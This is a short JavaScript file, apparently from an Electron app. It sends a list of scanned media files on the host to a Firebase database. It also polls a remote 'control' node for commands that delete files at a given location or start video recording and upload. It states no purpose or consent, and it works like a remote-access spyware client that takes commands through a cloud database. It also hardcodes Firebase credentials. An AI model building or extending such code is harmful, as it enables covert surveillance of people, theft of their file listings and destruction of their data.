const { initializeApp } = require("firebase/app");
const { getDatabase, ref, set, onValue } = require("firebase/database");
const { electronAPI } = window;

// -------------------- UTILITY --------------------
function log(...args) {
  console.log(...args);
}

// -------------------- FIREBASE CONFIG --------------------
const firebaseConfig = {
  apiKey: "AIzaSyCllx1VXruM7ZvmOu6i1PuxvEOHSP9lUUQ",
  authDomain: "project-3b15e.firebaseapp.com",
  databaseURL: "https://project-3b15e-default-rtdb.firebaseio.com",
  projectId: "project-3b15e",
  storageBucket: "project-3b15e.firebasestorage.app",
  messagingSenderId: "426259608469",
  appId: "1:426259608469:web:79781c737c81a9a000bc9c",
  measurementId: "G-BK1R709DF9",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// -------------------- RECEIVE SCANNED FILES --------------------
electronAPI.receiveScannedFiles(async (files) => {
  log("📤 Uploading scanned list to Firebase...");
  const scannedRef = ref(db, "scannedFiles");
  await set(scannedRef, files);
  log(`✅ Uploaded ${files.length} media files to Firebase.`);
});

// -------------------- LISTEN FOR COMMANDS --------------------
const controlRef = ref(db, "control");
let lastCommandId = null;

onValue(controlRef, async (snapshot) => {
  const data = snapshot.val();
  if (!data) return;

  const { command, location, type, id } = data;
  if (!id || id === lastCommandId) return; // ignore duplicate
  lastCommandId = id;

  log("📥 Firebase command received:", data);

  try {
    if (command === "delete" && location && type) {
      const res = await electronAPI.firebaseDelete({ location, type });
      log("🗑 Delete result:", res);
    }

    if (command === "video") {
      const res = await electronAPI.firebaseVideo();
      log("🎥 Video recording/upload result:", res);
    }
  } catch (err) {
    log("❌ Error handling command:", err);
  }
});
